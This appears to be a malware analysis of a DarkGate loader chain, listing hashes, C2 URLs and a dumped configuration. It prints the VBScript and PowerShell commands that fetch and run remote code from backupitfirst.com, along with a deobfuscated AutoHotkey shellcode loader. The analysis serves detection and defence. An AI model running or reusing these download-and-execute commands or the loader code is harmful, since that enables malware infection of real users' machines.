THREAT IDENTIFICATION: DARKGATE LOADER

XLSX FILE HASHES
re-march-26-2024-8170.xlsx
26cdf99e90642f8a092b3d78c38cf287

VBS FILE DOWNLOAD URL
\\170.130.55.130\share\a\Report-26-2024.vbs

RELEVANT PART OF THE VBSCRIPT FILE
tmgviuom = "Shell.Application"
roxqltxm = "-Command Invoke-Expression (Invoke-RestMethod -Uri 'backupitfirst.com/vckpqpzn')"
CreateObject(tmgviuom).ShellExecute "powershell", roxqltxm ,"","",0

INTERCEPTED POWERSHELL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (Invoke-RestMethod -Uri 'backupitfirst.com/vckpqpzn')

POWERSHELL SCRIPT DOWNLOAD URL
http://backupitfirst.com/vckpqpzn

POWERSHELL SCRIPT FILE HASH
vckpqpzn
b77d376b82bdd0dd6b5bced9649e7d85

POWERSHELL SCRIPT CONTENTS
ni 'C:/yddi/' - Type Directory - Force;
cd 'C:/yddi/';
Invoke - WebRequest - Uri "http://backupitfirst.com/wtabzuuxye" - OutFile 'C:/yddi/temp_AutoHotkey.exe';
[System.IO.File]::WriteAllBytes("C:/yddi/AutoHotkey.exe", ([System.IO.File]::ReadAllBytes("C:/yddi/temp_AutoHotkey.exe")[1024..([System.IO.File]::ReadAllBytes("C:/yddi/temp_AutoHotkey.exe").Length - 1)]));
Invoke - WebRequest - Uri "http://backupitfirst.com/ltndniiq" - OutFile 'C:/yddi/script.ahk';
Invoke - WebRequest - Uri "http://backupitfirst.com/hcmjchqj" - OutFile 'C:/yddi/test.txt';
start 'C:/yddi/AutoHotkey.exe' - a 'C:/yddi/script.ahk';
attrib + h 'C:/yddi/'

PAYLOAD FILES DOWNLOAD URLS
http://backupitfirst.com/wtabzuuxye
(Downloaded and renamed to: C:/yddi/AutoHotkey.exe)

http://backupitfirst.com/ltndniiq
(Downloaded and renamed to: C:/yddi/script.ahk)

http://backupitfirst.com/hcmjchqj
(Downloaded and renamed to: C:/yddi/test.txt)

PAYLOAD FILE HASHES
AutoHotkey.exe
c155f20367cdf6c5ab80051b8c627afa

script.ahk
e2a20b15c750ef1b6c6e6f545bb7264c

test.txt
16ebdbb857b74c224763a2e6882e6263

AUTOHOTKEY SCRIPT CONTENTS (DEOBFUSCATED)
#NoTrayIcon
MEM_COMMIT := 0x1000
MEM_RESERVE := 0x2000
PAGE_EXECUTE_READWRITE := 0x40
archivo := A_ScriptDir . "\test.txt"
FileRead, contenidoHex, %archivo%
size := 468718
lpAddress := DllCall("VirtualAlloc", "Ptr", 0, "UInt", size, "UInt", MEM_COMMIT | MEM_RESERVE, "UInt", PAGE_EXECUTE_READWRITE)
Loop, % size {
hexByte := "0x" . SubStr(contenidoHex, 2 * A_Index - 1, 2)
NumPut(hexByte, lpAddress + (A_Index - 1), "Char")
}
DllCall(lpAddress)

DUMPED PAYLOAD FILE HASH
4c40b3d.exe
e76bfcd6ededaf0c8d659371fe6d15c2

DARKGATE C2s
http://backupitfirst.com/

DUMPED CONFIGURATION
0x5041d68 (1025): 0=backupitfirst.com|
8=No
11=DarkGate
12=R0ijS0qCVITtS0e6xeZ
13=6
14=Yes
15=80
1=Yes
32=No
3=Yes
4=No
18=50
6=Yes
7=No
19=4000
5=No
21=No
22=No
23=No
31=Yes
24=excel
25=admin888
26=No
27=hKWabkFv
28=No
29=6
tabla=QuzCZB*)26hg.HEKbo73]$i[&09PvrSOMUqxXNL }m"tFJG(dwV,=4aps5cR8yDWT1jeknlAf{IY

